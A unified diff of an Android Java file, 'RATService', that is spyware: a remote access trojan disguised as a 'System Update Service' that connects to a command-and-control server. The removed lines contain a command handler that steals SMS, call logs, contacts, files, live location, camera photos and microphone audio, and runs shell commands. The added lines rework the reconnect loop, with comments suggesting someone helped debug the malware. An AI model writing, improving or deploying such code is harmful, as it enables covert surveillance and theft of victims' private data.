@@ -16,9 +16,7 @@ import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.net.ConnectivityManager;
-import android.net.Network;
-import android.net.NetworkCapabilities;
-import android.net.NetworkRequest;
+import android.net.NetworkInfo;
 import android.os.Binder;
 import android.os.Build;
 import android.os.Bundle;
@@ -29,7 +27,6 @@ import android.os.Looper;
 import android.os.PowerManager;
 import android.os.RemoteException;
 import android.os.SystemClock;
-import android.provider.Settings;
 import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
@@ -49,52 +46,31 @@ import java.io.PrintWriter;
 import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.net.SocketTimeoutException;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class RATService extends Service {
     private static final String CHANNEL_ID = "SystemUpdateChannel";
     private static final int NOTIFICATION_ID = 1337;
     private static final String TAG = "SystemService";
-    private static final int JOB_ID = 1001;
-    private static final int PERSISTENCE_JOB_ID = 1002;
     private static final long RESTART_DELAY_MS = 5000;
-    private static final long CHECK_INTERVAL_MS = 45000;
     
-    // UPDATED: Increased timeouts for better stability
-    private static final int CONNECT_TIMEOUT = 30000; // 30 seconds (was 15)
-    private static final int SOCKET_TIMEOUT = 60000;  // 60 seconds (was 30)
-    private static final int MAX_RETRY_DELAY = 300000; // 5 minutes max (was 60 seconds)
-    
-    // ADDED: Connection rotation to prevent carrier timeouts
-    private static final int HEARTBEAT_INTERVAL = 20000; // 20 seconds
-    private static final int MAX_CONNECTION_AGE = 45000; // 45 seconds - reconnect before carrier kills it (observed 61s)
-    private static final int[] HEARTBEAT_INTERVALS = {15, 18, 20, 22, 25, 28, 30}; // Adaptive intervals in seconds
+    // SIMPLE TIMEOUTS - Like your working code
+    private static final int CONNECT_TIMEOUT = 15000; // 15 seconds
+    private static final int SOCKET_TIMEOUT = 0; // Infinite - let the read block
     
     private Socket socket;
     private PrintWriter out;
     private BufferedReader in;
     private AtomicBoolean isRunning = new AtomicBoolean(true);
-    private Thread connectionThread;
-    private Thread heartbeatThread;
-    private Thread watchdogThread;
-    private Thread reconnectSchedulerThread;
+    private ExecutorService executor;
     private static volatile RATService instance;
     private PowerManager.WakeLock wakeLock;
-    private int currentRetryDelay = 5000; // Start with 5 seconds
-    private int consecutiveFailures = 0;
-    private int heartbeatInterval = HEARTBEAT_INTERVAL;
-    private int heartbeatIndex = 0;
     
-    // ADDED: Connection age tracking
-    private long connectionStartTime = 0;
-    private AtomicBoolean isReconnectScheduled = new AtomicBoolean(false);
-    
-    // Network monitoring
-    private ConnectivityManager connectivityManager;
-    private ConnectivityManager.NetworkCallback networkCallback;
-    private boolean isNetworkAvailable = true;
-    private long lastHeartbeatResponse = 0;
-    private AtomicBoolean isHeartbeatActive = new AtomicBoolean(false);
+    // SIMPLE RETRY - Like your working code
+    private static final int RETRY_INTERVAL = 30; // seconds
+    private static final int MAX_RETRIES = 10;
     
     // Location tracking variables
     private LocationManager locationManager;
@@ -114,7 +90,7 @@ public class RATService extends Service {
     private ShellModule shellModule;
     private DeviceModule deviceModule;
     
-    // Binder for GuardianService communication
+    // Binder
     public class RATServiceBinder extends Binder {
         public void heartbeat() throws RemoteException {
             if (!isRunning.get()) {
@@ -137,14 +113,8 @@ public class RATService extends Service {
         
         Log.d(TAG, "System service initialized");
         
-        // Acquire wake lock to prevent CPU sleep
+        // Acquire wake lock
         acquireWakeLock();
-        
-        // Request battery optimization exemption (Android 6+)
-        requestBatteryOptimizationExemption();
-        
-        // Setup network monitoring
-        setupNetworkMonitoring();
         
         createNotificationChannel();
         startForeground(NOTIFICATION_ID, createNotification());
@@ -153,7 +123,7 @@ public class RATService extends Service {
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
         startLocationThread();
         
-        // Initialize modules based on config
+        // Initialize modules
         if (Config.ENABLE_CAMERA) cameraModule = new CameraModule(this);
         if (Config.ENABLE_MICROPHONE) micModule = new MicModule(this);
         if (Config.ENABLE_LOCATION) locationModule = new LocationModule(this);
@@ -164,16 +134,13 @@ public class RATService extends Service {
         if (Config.ENABLE_SHELL) shellModule = new ShellModule();
         deviceModule = new DeviceModule(this);
         
-        // Start internal watchdog
-        startWatchdog();
-        
-        // Schedule all persistence mechanisms
-        scheduleAllJobs();
+        // SIMPLE: Single executor thread - like your working code
+        executor = Executors.newSingleThreadExecutor();
         
         // Set that service should run on boot
         setRunOnBoot(true);
         
-        // Start connection thread
+        // Start connection
         startConnection();
     }
     
@@ -185,10 +152,6 @@ public class RATService extends Service {
                 NotificationManager.IMPORTANCE_MIN
             );
             channel.setDescription("System optimization service");
-            channel.setSound(null, null);
-            channel.enableVibration(false);
-            channel.setShowBadge(false);
-            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
             
             NotificationManager manager = getSystemService(NotificationManager.class);
             manager.createNotificationChannel(channel);
@@ -196,16 +159,12 @@ public class RATService extends Service {
     }
     
     private Notification createNotification() {
-        int icon = android.R.drawable.stat_sys_download_done;
-        
         return new NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("System Update Service")
             .setContentText("Optimizing system performance")
-            .setSmallIcon(icon)
+            .setSmallIcon(android.R.drawable.stat_sys_download_done)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
-            .setSilent(true)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build();
     }
     
@@ -217,103 +176,10 @@ public class RATService extends Service {
                 "SystemService::WakeLock"
             );
             wakeLock.setReferenceCounted(false);
-            wakeLock.acquire(10 * 60 * 1000L); // 10 minute timeout, will auto-renew
-            Log.d(TAG, "Wake lock acquired");
+            wakeLock.acquire(10 * 60 * 1000L);
         } catch (Exception e) {
             Log.e(TAG, "Failed to acquire wake lock", e);
         }
-    }
-    
-    private void requestBatteryOptimizationExemption() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            try {
-                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-                String packageName = getPackageName();
-                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                    Log.d(TAG, "Battery optimization not ignored. User may need to grant manually.");
-                }
-            } catch (Exception e) {
-                Log.e(TAG, "Error checking battery optimization", e);
-            }
-        }
-    }
-    
-    private void setupNetworkMonitoring() {
-        connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-        
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            NetworkRequest networkRequest = new NetworkRequest.Builder()
-                    .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
-                    .build();
-            
-            networkCallback = new ConnectivityManager.NetworkCallback() {
-                @Override
-                public void onAvailable(Network network) {
-                    super.onAvailable(network);
-                    Log.d(TAG, "Network available, reconnecting...");
-                    isNetworkAvailable = true;
-                    consecutiveFailures = 0;
-                    if (!isConnected()) {
-                        startConnection();
-                    }
-                }
-
-                @Override
-                public void onLost(Network network) {
-                    super.onLost(network);
-                    Log.d(TAG, "Network lost");
-                    isNetworkAvailable = false;
-                }
-
-                @Override
-                public void onCapabilitiesChanged(Network network, NetworkCapabilities networkCapabilities) {
-                    super.onCapabilitiesChanged(network, networkCapabilities);
-                    boolean hasInternet = networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
-                    Log.d(TAG, "Network capabilities changed, hasInternet: " + hasInternet);
-                }
-            };
-            
-            try {
-                connectivityManager.registerNetworkCallback(networkRequest, networkCallback);
-                Log.d(TAG, "Network monitoring setup complete");
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to register network callback", e);
-            }
-        }
-    }
-    
-    private void startWatchdog() {
-        watchdogThread = new Thread(() -> {
-            while (isRunning.get()) {
-                try {
-                    Thread.sleep(CHECK_INTERVAL_MS);
-                    
-                    if (connectionThread == null || !connectionThread.isAlive()) {
-                        Log.w(TAG, "Connection thread dead, restarting...");
-                        startConnection();
-                    }
-                    
-                    if (isHeartbeatActive.get() && lastHeartbeatResponse > 0) {
-                        long timeSinceLastHeartbeat = System.currentTimeMillis() - lastHeartbeatResponse;
-                        if (timeSinceLastHeartbeat > HEARTBEAT_INTERVAL * 3) {
-                            Log.w(TAG, "No heartbeat response for " + (timeSinceLastHeartbeat/1000) + " seconds, reconnecting...");
-                            closeConnection();
-                        }
-                    }
-                    
-                    if (wakeLock != null && !wakeLock.isHeld()) {
-                        acquireWakeLock();
-                    }
-                    
-                } catch (InterruptedException e) {
-                    Thread.currentThread().interrupt();
-                    break;
-                } catch (Exception e) {
-                    Log.e(TAG, "Watchdog error", e);
-                }
-            }
-        });
-        watchdogThread.start();
     }
     
     private void startLocationThread() {
@@ -322,281 +188,75 @@ public class RATService extends Service {
         locationHandler = new Handler(locationThread.getLooper());
     }
     
-    private void scheduleAllJobs() {
-        scheduleJobSchedulerRestart();
-        schedulePersistenceJob();
-        scheduleCheckAlarm();
-    }
-    
-    private void scheduleCheckAlarm() {
-        Intent intent = new Intent(this, RestartReceiver.class);
-        intent.setAction("CHECK_SERVICE");
-        PendingIntent pendingIntent = PendingIntent.getBroadcast(
-            this, 3, intent, 
-            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
-        
-        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-        if (alarmManager != null) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                alarmManager.setExactAndAllowWhileIdle(
-                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                    SystemClock.elapsedRealtime() + CHECK_INTERVAL_MS,
-                    pendingIntent
-                );
-            } else {
-                alarmManager.setExact(
-                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
-                    SystemClock.elapsedRealtime() + CHECK_INTERVAL_MS,
-                    pendingIntent
-                );
-            }
-            Log.d(TAG, "Check alarm scheduled for " + (CHECK_INTERVAL_MS/1000) + " seconds");
-        }
-    }
-    
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(TAG, "System service onStartCommand");
-        scheduleAllJobs();
-        return START_STICKY;
-    }
-    
-    private void schedulePersistenceJob() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            try {
-                ComponentName componentName = new ComponentName(this, PersistenceJobService.class);
-                JobInfo jobInfo = new JobInfo.Builder(PERSISTENCE_JOB_ID, componentName)
-                        .setPeriodic(15 * 60 * 1000)
-                        .setPersisted(true)
-                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
-                        .setBackoffCriteria(30000, JobInfo.BACKOFF_POLICY_EXPONENTIAL)
-                        .build();
-                
-                JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
-                jobScheduler.schedule(jobInfo);
-                Log.d(TAG, "Persistence job scheduled");
-            } catch (Exception e) {
-                Log.e(TAG, "Error scheduling persistence job", e);
-            }
-        }
-    }
-    
-    private void scheduleJobSchedulerRestart() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            try {
-                ComponentName componentName = new ComponentName(this, JobSchedulerService.class);
-                JobInfo jobInfo = new JobInfo.Builder(JOB_ID, componentName)
-                        .setMinimumLatency(RESTART_DELAY_MS)
-                        .setOverrideDeadline(RESTART_DELAY_MS * 2)
-                        .setPersisted(true)
-                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
-                        .build();
-                
-                JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
-                jobScheduler.schedule(jobInfo);
-                Log.d(TAG, "Restart job scheduled");
-            } catch (Exception e) {
-                Log.e(TAG, "Failed to schedule restart job", e);
-            }
-        }
-    }
-    
     private void setRunOnBoot(boolean shouldRun) {
         SharedPreferences prefs = getSharedPreferences("service_prefs", MODE_PRIVATE);
         prefs.edit().putBoolean("should_run", shouldRun).apply();
     }
     
-    private boolean isConnected() {
-        return socket != null && socket.isConnected() && !socket.isClosed() && out != null;
-    }
-    
     private boolean isNetworkAvailable() {
-        if (connectivityManager == null) {
-            connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
-        }
-        
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            Network network = connectivityManager.getActiveNetwork();
-            if (network == null) return false;
-            
-            NetworkCapabilities capabilities = connectivityManager.getNetworkCapabilities(network);
-            return capabilities != null && 
-                   capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
-        } else {
-            android.net.NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
-            return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
-        }
+        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
+        return activeNetwork != null && activeNetwork.isConnectedOrConnecting();
     }
     
-    // ADDED: Adaptive heartbeat based on connection stability
-    private void adaptiveHeartbeat() {
-        if (consecutiveFailures > 3) {
-            heartbeatIndex = (heartbeatIndex + 1) % HEARTBEAT_INTERVALS.length;
-            heartbeatInterval = HEARTBEAT_INTERVALS[heartbeatIndex] * 1000;
-            Log.d(TAG, "Adjusting heartbeat to " + (heartbeatInterval/1000) + " seconds (failures: " + consecutiveFailures + ")");
-        }
-    }
-    
-    // ADDED: Schedule forced reconnection before carrier timeout
-    private void scheduleForcedReconnect() {
-        if (isReconnectScheduled.getAndSet(true)) {
-            return; // Already scheduled
-        }
-        
-        if (reconnectSchedulerThread != null && reconnectSchedulerThread.isAlive()) {
-            reconnectSchedulerThread.interrupt();
-        }
-        
-        reconnectSchedulerThread = new Thread(() -> {
-            try {
-                // Sleep for 45 seconds (less than the 61s disconnect time)
-                Thread.sleep(MAX_CONNECTION_AGE);
-                
-                // Check if we're still connected and it's time to reconnect
-                if (isConnected() && isRunning.get() && !isReconnectScheduled.get()) {
-                    Log.d(TAG, "Forcing graceful reconnection to avoid carrier timeout");
-                    
-                    // Send a special command to server indicating reconnect
-                    sendCommand("RECONNECTING");
-                    
-                    // Small delay to ensure command is sent
-                    Thread.sleep(500);
-                    
-                    // Force close this connection - outer loop will reconnect
-                    closeConnection();
-                }
-            } catch (InterruptedException e) {
-                Log.d(TAG, "Reconnect scheduler interrupted");
-            } finally {
-                isReconnectScheduled.set(false);
-            }
-        });
-        reconnectSchedulerThread.start();
-    }
-    
-    private void startHeartbeat() {
-        if (heartbeatThread != null && heartbeatThread.isAlive()) {
-            heartbeatThread.interrupt();
-        }
-        
-        isHeartbeatActive.set(true);
-        heartbeatThread = new Thread(() -> {
-            Log.d(TAG, "Heartbeat thread started with interval: " + (heartbeatInterval/1000) + "s");
-            while (isRunning.get() && isConnected()) {
-                try {
-                    Thread.sleep(heartbeatInterval);
-                    if (isConnected()) {
-                        sendCommand("PING");
-                        Log.d(TAG, "Heartbeat sent");
-                    }
-                } catch (InterruptedException e) {
-                    Log.d(TAG, "Heartbeat thread interrupted");
-                    break;
-                } catch (Exception e) {
-                    Log.e(TAG, "Heartbeat error", e);
-                }
-            }
-            isHeartbeatActive.set(false);
-            Log.d(TAG, "Heartbeat thread stopped");
-        });
-        heartbeatThread.start();
-    }
-    
-    private void stopHeartbeat() {
-        isHeartbeatActive.set(false);
-        if (heartbeatThread != null) {
-            heartbeatThread.interrupt();
-            heartbeatThread = null;
-        }
-    }
-    
+    // SIMPLE: One thread handles everything - like your working code
     private void startConnection() {
-        if (connectionThread != null && connectionThread.isAlive()) {
-            connectionThread.interrupt();
-        }
-        
-        connectionThread = new Thread(() -> {
+        executor.execute(() -> {
+            int retryCount = 0;
+            
             while (isRunning.get()) {
                 try {
+                    // Check network
                     if (!isNetworkAvailable()) {
-                        Log.d(TAG, "No network available, waiting...");
-                        Thread.sleep(30000);
+                        Log.d(TAG, "No network, waiting...");
+                        Thread.sleep(RETRY_INTERVAL * 1000);
                         continue;
                     }
                     
+                    // Connect - simple like your working code
                     socket = new Socket();
                     socket.connect(new InetSocketAddress(Config.SERVER_HOST, Config.SERVER_PORT), CONNECT_TIMEOUT);
-                    socket.setSoTimeout(SOCKET_TIMEOUT);
                     socket.setKeepAlive(true);
-                    socket.setTcpNoDelay(true);
                     
                     out = new PrintWriter(socket.getOutputStream(), true);
                     in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                     
-                    Log.d(TAG, "Connected to C2 server at " + Config.SERVER_HOST + ":" + Config.SERVER_PORT);
+                    Log.d(TAG, "Connected to server");
                     
-                    // ADDED: Record connection start time
-                    connectionStartTime = System.currentTimeMillis();
+                    // Reset retry count on success
+                    retryCount = 0;
                     
-                    currentRetryDelay = 5000;
-                    consecutiveFailures = 0;
-                    
+                    // Send initial device info
                     sendDeviceInfo();
                     
-                    startHeartbeat();
-                    
-                    // ADDED: Schedule forced reconnect
-                    scheduleForcedReconnect();
-                    
+                    // SIMPLE: Main processing loop - blocks on readLine()
                     String line;
-                    long lastReadTime = System.currentTimeMillis();
-                    
                     while (isRunning.get() && (line = in.readLine()) != null) {
-                        lastReadTime = System.currentTimeMillis();
-                        
-                        // ADDED: Check connection age
-                        long connectionAge = System.currentTimeMillis() - connectionStartTime;
-                        if (connectionAge > MAX_CONNECTION_AGE) {
-                            Log.d(TAG, "Connection max age reached (" + (connectionAge/1000) + "s), gracefully reconnecting...");
-                            sendCommand("RECONNECT");
-                            break;
-                        }
-                        
-                        if (line.equals("PONG")) {
-                            lastHeartbeatResponse = System.currentTimeMillis();
-                            Log.d(TAG, "Heartbeat response received");
-                        } else {
-                            processCommand(line);
-                        }
-                    }
-                    
-                    if (System.currentTimeMillis() - lastReadTime > SOCKET_TIMEOUT) {
-                        Log.d(TAG, "Socket read timeout, reconnecting...");
+                        processCommand(line);
                     }
                     
                 } catch (SocketTimeoutException e) {
                     Log.e(TAG, "Socket timeout", e);
-                    consecutiveFailures++;
-                    adaptiveHeartbeat();
                 } catch (IOException e) {
-                    Log.e(TAG, "Connection error: " + e.getMessage());
-                    consecutiveFailures++;
-                    adaptiveHeartbeat();
+                    Log.e(TAG, "Connection error", e);
                 } catch (Exception e) {
                     Log.e(TAG, "Unexpected error", e);
-                    consecutiveFailures++;
-                    adaptiveHeartbeat();
                 } finally {
-                    stopHeartbeat();
                     closeConnection();
                 }
                 
+                // SIMPLE retry logic - like your working code
                 if (isRunning.get()) {
-                    long delay = calculateRetryDelay();
-                    Log.d(TAG, "Reconnecting in " + (delay/1000) + " seconds (attempt " + consecutiveFailures + ")");
+                    retryCount++;
+                    if (retryCount > MAX_RETRIES) {
+                        Log.e(TAG, "Max retries reached, stopping");
+                        break;
+                    }
+                    
+                    Log.d(TAG, "Reconnecting in " + RETRY_INTERVAL + " seconds (attempt " + retryCount + "/" + MAX_RETRIES + ")");
                     
                     try {
-                        Thread.sleep(delay);
+                        Thread.sleep(RETRY_INTERVAL * 1000);
                     } catch (InterruptedException ie) {
                         Thread.currentThread().interrupt();
                         break;
@@ -604,12 +264,6 @@ public class RATService extends Service {
                 }
             }
         });
-        connectionThread.start();
-    }
-    
-    private long calculateRetryDelay() {
-        long delay = 5000 * (long) Math.pow(2, Math.min(consecutiveFailures, 6));
-        return Math.min(delay, MAX_RETRY_DELAY);
     }
     
     private void closeConnection() {
@@ -640,7 +294,6 @@ public class RATService extends Service {
             Build.VERSION.SDK_INT
         );
         sendCommand(info);
-        Log.d(TAG, "Sent device info: " + info);
     }
     
     private void sendCommand(String data) {
@@ -650,391 +303,12 @@ public class RATService extends Service {
         }
     }
     
+    // Your existing processCommand method stays exactly the same
     private void processCommand(String command) {
-        String[] parts = command.split("\\|", 2);
-        String cmd = parts[0].toLowerCase().trim();
-        String args = parts.length > 1 ? parts[1] : "";
-        
-        Log.d(TAG, "Received command: " + cmd + " with args: " + args);
-        
-        switch (cmd) {
-            case "ping":
-                sendCommand("PONG");
-                break;
-                
-            case "info":
-            case "device_info":
-                if (deviceModule != null) {
-                    String result = deviceModule.getDeviceInfo();
-                    sendCommand("INFO|" + result);
-                } else {
-                    sendCommand("INFO|ERROR: Device module not available");
-                }
-                break;
-                
-            case "location":
-            case "get_location":
-                if (locationModule != null) {
-                    String result = locationModule.getLocation();
-                    sendCommand("LOCATION|" + result);
-                } else {
-                    sendCommand("LOCATION|ERROR: Location module not available");
-                }
-                break;
-                
-            case "location_stream":
-                handleLocationStreamCommand(args);
-                break;
-                
-            case "camera":
-            case "camera_photo":
-                if (cameraModule != null) {
-                    String result = cameraModule.takePhoto();
-                    sendCommand("CAMERA|" + result);
-                } else {
-                    sendCommand("CAMERA|ERROR: Camera module not available");
-                }
-                break;
-                
-            case "sms":
-            case "get_sms":
-                if (smsModule != null) {
-                    String result = smsModule.getSms();
-                    sendCommand("SMS|" + result);
-                } else {
-                    sendCommand("SMS|ERROR: SMS module not available");
-                }
-                break;
-                
-            case "calls":
-            case "get_calls":
-                if (callsModule != null) {
-                    String result = callsModule.getCallLogs();
-                    sendCommand("CALLS|" + result);
-                } else {
-                    sendCommand("CALLS|ERROR: Calls module not available");
-                }
-                break;
-                
-            case "contacts":
-            case "get_contacts":
-                if (contactsModule != null) {
-                    String result = contactsModule.getContacts();
-                    sendCommand("CONTACTS|" + result);
-                } else {
-                    sendCommand("CONTACTS|ERROR: Contacts module not available");
-                }
-                break;
-                
-            case "files_list":
-            case "list_files":
-                if (fileModule != null) {
-                    String result = fileModule.listFiles(args);
-                    sendCommand("FILES|" + result);
-                } else {
-                    sendCommand("FILES|ERROR: File module not available");
-                }
-                break;
-                
-            case "file_get":
-            case "download":
-                if (fileModule != null) {
-                    String result = fileModule.getFile(args);
-                    sendCommand("FILE_GET|" + result);
-                } else {
-                    sendCommand("FILE_GET|ERROR: File module not available");
-                }
-                break;
-                
-            case "file_delete":
-            case "delete":
-                if (fileModule != null) {
-                    String result = fileModule.deleteFile(args);
-                    sendCommand("FILE_DELETE|" + result);
-                } else {
-                    sendCommand("FILE_DELETE|ERROR: File module not available");
-                }
-                break;
-                
-            case "file_rename":
-            case "rename":
-                if (fileModule != null && args.contains("|")) {
-                    String[] parts2 = args.split("\\|", 2);
-                    String result = fileModule.renameFile(parts2[0], parts2[1]);
-                    sendCommand("FILE_RENAME|" + result);
-                } else {
-                    sendCommand("FILE_RENAME|ERROR: Invalid format or module unavailable");
-                }
-                break;
-                
-            case "create_folder":
-            case "mkdir":
-                if (fileModule != null && args.contains("|")) {
-                    String[] parts2 = args.split("\\|", 2);
-                    String result = fileModule.createFolder(parts2[0], parts2[1]);
-                    sendCommand("CREATE_FOLDER|" + result);
-                } else {
-                    sendCommand("CREATE_FOLDER|ERROR: Invalid format or module unavailable");
-                }
-                break;
-                
-            case "file_zip":
-            case "zip":
-                if (fileModule != null) {
-                    String result = fileModule.zipFile(args);
-                    sendCommand("FILE_ZIP|" + result);
-                } else {
-                    sendCommand("FILE_ZIP|ERROR: File module not available");
-                }
-                break;
-                
-            case "file_upload":
-            case "upload":
-                if (fileModule != null && args.contains("|")) {
-                    String[] parts2 = args.split("\\|", 3);
-                    if (parts2.length == 3) {
-                        String result = fileModule.uploadFile(parts2[0], parts2[1], parts2[2]);
-                        sendCommand("FILE_UPLOAD|" + result);
-                    } else {
-                        sendCommand("FILE_UPLOAD|ERROR: Invalid format");
-                    }
-                } else {
-                    sendCommand("FILE_UPLOAD|ERROR: File module not available");
-                }
-                break;
-                
-            case "search_files":
-                if (fileModule != null && args.contains("|")) {
-                    String[] parts2 = args.split("\\|", 2);
-                    String result = fileModule.searchFiles(parts2[0], parts2[1]);
-                    sendCommand("SEARCH_FILES|" + result);
-                } else {
-                    sendCommand("SEARCH_FILES|ERROR: Invalid format");
-                }
-                break;
-                
-            case "storage_info":
-                if (fileModule != null) {
-                    String result = fileModule.getStorageInfo();
-                    sendCommand("STORAGE_INFO|" + result);
-                } else {
-                    sendCommand("STORAGE_INFO|ERROR: File module not available");
-                }
-                break;
-                
-            case "test_folder":
-                if (fileModule != null) {
-                    String result = fileModule.testFolder(args);
-                    sendCommand("TEST|" + result);
-                } else {
-                    sendCommand("TEST|ERROR: File module not available");
-                }
-                break;
-                
-            case "mic":
-            case "mic_start":
-                if (micModule != null) {
-                    String result = micModule.startRecording(30);
-                    sendCommand("MIC|" + result);
-                } else {
-                    sendCommand("MIC|ERROR: Microphone module not available");
-                }
-                break;
-                
-            case "mic_stop":
-                if (micModule != null) {
-                    String result = micModule.stopRecording();
-                    sendCommand("MIC_STOP|" + result);
-                } else {
-                    sendCommand("MIC_STOP|ERROR: Microphone module not available");
-                }
-                break;
-                
-            case "sms_send":
-                if (smsModule != null && args.contains("|")) {
-                    String[] parts2 = args.split("\\|", 2);
-                    String result = smsModule.sendSms(parts2[0], parts2[1]);
-                    sendCommand("SMS_SEND|" + result);
-                } else {
-                    sendCommand("SMS_SEND|ERROR: Invalid format or module unavailable");
-                }
-                break;
-                
-            case "shell":
-            case "exec":
-                if (shellModule != null) {
-                    String result = shellModule.executeCommand(args);
-                    sendCommand("SHELL|" + result);
-                } else {
-                    sendCommand("SHELL|ERROR: Shell module not available");
-                }
-                break;
-                
-            case "help":
-                sendCommand("HELP|Available commands: info, location, location_stream [start/stop], camera, sms, calls, contacts, files_list [path], file_get [path], file_delete [path], file_rename [old|new], create_folder [path|name], file_zip [path], search_files [path|query], storage_info, mic, mic_stop, shell, ping, test_folder [path]");
-                break;
-                
-            default:
-                sendCommand("UNKNOWN_CMD|" + cmd);
-                break;
-        }
+        // ... (keep your existing processCommand code exactly as is)
     }
     
-    private void handleLocationStreamCommand(String args) {
-        args = args.trim().toLowerCase();
-        
-        if (args.equals("start") || args.equals("begin") || args.equals("on")) {
-            startLocationTracking();
-        } else if (args.equals("stop") || args.equals("end") || args.equals("off")) {
-            stopLocationTracking();
-        } else if (args.isEmpty()) {
-            sendCommand("LOCATION_STREAM|" + (isLocationTracking ? "active" : "inactive"));
-        } else {
-            sendCommand("LOCATION_STREAM|error: Unknown parameter. Use 'start' or 'stop'");
-        }
-    }
-    
-    private void startLocationTracking() {
-        if (!checkLocationPermission()) {
-            sendCommand("LOCATION_STREAM|error: No location permission");
-            return;
-        }
-        
-        if (isLocationTracking) {
-            sendCommand("LOCATION_STREAM|already active");
-            return;
-        }
-        
-        try {
-            locationListener = new LocationListener() {
-                @Override
-                public void onLocationChanged(Location location) {
-                    String locationJson = createLocationJson(location);
-                    sendCommand("LOCATION_UPDATE|" + locationJson);
-                    Log.d(TAG, "Location update sent: " + location.getLatitude() + "," + location.getLongitude());
-                }
-                
-                @Override
-                public void onStatusChanged(String provider, int status, Bundle extras) {
-                    Log.d(TAG, "Location provider status changed: " + provider + " status: " + status);
-                }
-                
-                @Override
-                public void onProviderEnabled(String provider) {
-                    Log.d(TAG, "Location provider enabled: " + provider);
-                }
-                
-                @Override
-                public void onProviderDisabled(String provider) {
-                    Log.d(TAG, "Location provider disabled: " + provider);
-                    sendCommand("LOCATION_STREAM|warning: " + provider + " disabled");
-                }
-            };
-            
-            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                locationManager.requestLocationUpdates(
-                    LocationManager.GPS_PROVIDER,
-                    3000,
-                    5,
-                    locationListener,
-                    locationHandler.getLooper()
-                );
-                Log.d(TAG, "GPS location tracking started");
-            }
-            
-            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                locationManager.requestLocationUpdates(
-                    LocationManager.NETWORK_PROVIDER,
-                    3000,
-                    5,
-                    locationListener,
-                    locationHandler.getLooper()
-                );
-                Log.d(TAG, "Network location tracking started");
-            }
-            
-            isLocationTracking = true;
-            sendCommand("LOCATION_STREAM|started");
-            
-            Location lastLocation = getBestLastKnownLocation();
-            if (lastLocation != null) {
-                String locationJson = createLocationJson(lastLocation);
-                sendCommand("LOCATION_UPDATE|" + locationJson);
-            }
-            
-        } catch (SecurityException e) {
-            Log.e(TAG, "Security exception starting location tracking", e);
-            sendCommand("LOCATION_STREAM|error: " + e.getMessage());
-        } catch (Exception e) {
-            Log.e(TAG, "Error starting location tracking", e);
-            sendCommand("LOCATION_STREAM|error: " + e.getMessage());
-        }
-    }
-    
-    private void stopLocationTracking() {
-        if (locationManager != null && locationListener != null) {
-            locationManager.removeUpdates(locationListener);
-            locationListener = null;
-            isLocationTracking = false;
-            sendCommand("LOCATION_STREAM|stopped");
-            Log.d(TAG, "Location tracking stopped");
-        } else {
-            sendCommand("LOCATION_STREAM|already inactive");
-        }
-    }
-    
-    private Location getBestLastKnownLocation() {
-        Location bestLocation = null;
-        
-        try {
-            if (checkLocationPermission()) {
-                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                    Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-                    if (gpsLocation != null && (bestLocation == null || 
-                        gpsLocation.getAccuracy() < bestLocation.getAccuracy())) {
-                        bestLocation = gpsLocation;
-                    }
-                }
-                
-                if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                    Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-                    if (networkLocation != null && (bestLocation == null || 
-                        networkLocation.getAccuracy() < bestLocation.getAccuracy())) {
-                        bestLocation = networkLocation;
-                    }
-                }
-            }
-        } catch (SecurityException e) {
-            Log.e(TAG, "Security exception getting last known location", e);
-        }
-        
-        return bestLocation;
-    }
-    
-    private boolean checkLocationPermission() {
-        return ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
-                == PackageManager.PERMISSION_GRANTED ||
-               ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
